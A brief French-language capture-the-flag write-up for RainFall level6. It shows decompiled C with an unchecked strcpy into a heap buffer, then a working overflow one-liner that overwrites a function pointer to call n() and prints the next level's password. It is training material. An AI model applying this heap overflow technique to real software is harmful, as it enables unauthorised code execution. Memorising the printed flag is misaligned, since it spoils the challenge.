Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=bf99b17b-f29d-4c51-9cac-5055972d80ea#Ghidra=154

```c
void n(void) {
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5) {
  puts("Nope");
  return;
}

void main(int argc,char **argv) {
  char *__dest;
  int**ppcVar1;
 
  __dest = (char *)malloc(64); // 0x40
  ppcVar1 = malloc(4);
  *ppcVar1 = m;
  strcpy(__dest, argv[1]);
  (**ppcVar1)();
  return;
}
```

# Explication

A partir de la position 72 on segfault. Donc le padding nécessaire est 72 caractères puis on ajoute l’adresse de la fonction `n`.

```
(gdb) p n
$5 = 0x8048454 <n>
```

On obtient :

```
level6@RainFall:~$ ./level6 $(python -c 'print("a" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
